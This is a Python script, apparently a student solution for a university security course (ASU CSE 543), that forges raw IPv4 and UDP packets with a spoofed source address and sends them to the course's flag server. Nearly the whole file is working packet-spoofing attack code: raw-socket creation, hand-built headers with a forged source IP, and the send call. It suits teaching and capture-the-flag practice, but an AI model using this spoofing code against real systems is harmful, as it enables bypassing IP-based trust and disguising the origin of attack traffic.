"""
UDP Spoofing for ASU CSE 543
"""
#import os
#import time
import socket
import struct
import sys
import errno
#import fcntl
import psutil

def get_ip_address_iface(family, ifacename):
    interface_list = dict()
    for interface, snics in psutil.net_if_addrs().items():
        for snic in snics:
            if snic.family == family:
                interface_list[interface] = snic.address
    try:
        return interface_list[ifacename]
    except:
        return ""

def make_ipv4_header_udp(srcip, dstip, datal):
    """
    Craft a raw IP header for UDP.
    """
    srcip = socket.inet_aton(srcip) # create the structure for source IP
    dstip = socket.inet_aton(dstip) # create the structure for destination IP

    ver = 4                     # Version 4 for IPv4
    ihl = 5                     # Header length in 32 bit words. 5 words == 20 bytes
    dscp_ecn = 0                # Optional fields, not required
    tlen = datal + 28           # Length of data + 20 bytes ipv4 header + 8 bytes udp header
    ident = socket.htons(54321) # ID of packet
    flg_frgoff = 0              # Flags and fragment offset
    ttl = 64                    # Time to live
    ptcl = 17                   # Protocol, 17 (UDP)
    chksm = 0                   # The OS will (hopefully...) fill in checksum

    # Creates the struct for the IP header
    return struct.pack(
        "!"     # Means network (Big Endian)
        "2B"    # Version and IHL, DSCP and ECN
        "3H"    # Total Length, Identification, Flags and Fragment Offset
        "2B"    # Time to live, Protocol
        "H"     # Checksum
        "4s"    # Source IP
        "4s"    # Destination IP
        , (ver << 4) + ihl, dscp_ecn, tlen, ident, flg_frgoff, ttl, ptcl, chksm, srcip,
            dstip)

def make_udp_header(srcprt, dstprt, datal):
    """
    Craft a raw UDP header.

    UDP headers are trivial.
    From https://www.ietf.org/rfc/rfc768.txt

    Format
    ------
    0      7 8     15 16    23 24    31
    +--------+--------+--------+--------+
    |     Source      |   Destination   |
    |      Port       |      Port       |
    +--------+--------+--------+--------+
    |                 |                 |
    |     Length      |    Checksum     |
    +--------+--------+--------+--------+
    |
    |          data octets ...
    +---------------- ...

        User Datagram Header Format
    """
    return struct.pack(
        "!4H"   #Source port, Destination port, Length, Checksum
        , srcprt, dstprt, datal+8, 0)

def make_udp_packet(src, dst, data):
    """
    Assembles the UDP packet.
    Just jams together IP header, UDP header and UDP data.
    """
    ip_header = make_ipv4_header_udp(src[0], dst[0], len(data))
    udp_header = make_udp_header(src[1], dst[1], len(data))
    return ip_header + udp_header + bytes(data,'UTF-8')

# Addresses and data
FLAG_SERVER_ADDR = 'flagserv.cse543.rev.fish'               # provided by the assignment
FLAG_SERVER_IP = socket.gethostbyname(FLAG_SERVER_ADDR)     # resolve IP from the name
FLAG_SERVER_PORT = 13337                                    # provided by the assignment
SOURCE_PORT = 0                         # binding on port 0 will make the OS pick a valid one
SPOOFED_SRC = '10.2.4.10'                                   # provided by the assignment

#MESSAGE = get_ip_address_iface(socket.AF_INET, "tap0")      # we only do IPv4 right now
MESSAGE = get_ip_address_iface(socket.AF_INET, "eth0")      # we only do IPv4 right now
#MESSAGE = get_ip_address_iface(socket.AF_INET6, "tap0")

if MESSAGE == "":
    print("tap0 interface must be up! Exiting")
    sys.exit()

print ("UDP target ADDR: %s" % FLAG_SERVER_ADDR)
print ("UDP target IP: %s" % FLAG_SERVER_IP)
print ("UDP target port: %d" % FLAG_SERVER_PORT)
print ("UDP source IP: %s" % SPOOFED_SRC)
print ("UDP source port: %d" % SOURCE_PORT)
print ("Message being sent: %s" % MESSAGE)

# Create raw UDP datagram sockets for sending the message.
# If it is failing, most likely it is because the program is not ran as root user/setuid
try:
    sock_snd = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
    print ("Socket created")
except IOError as error:
    if error.errno != errno.EINTR:
        print ("Socket creation failed (did you run it as root?). Error Code : " +
            str(error.errno))
        sys.exit()

# Assembles the UDP packet
raw_packet = make_udp_packet((SPOOFED_SRC, SOURCE_PORT), (FLAG_SERVER_IP,
    FLAG_SERVER_PORT),
    MESSAGE)

# Creates a raw socket
try:
    sock_snd.sendto(raw_packet, (FLAG_SERVER_IP, FLAG_SERVER_PORT))
    print ("Sending message successful!")
except IOError as error:
    if error.errno != errno.EINTR:
        print ("Socket connect failed. Error Code : " +
            str(error.errno))
        sys.exit()
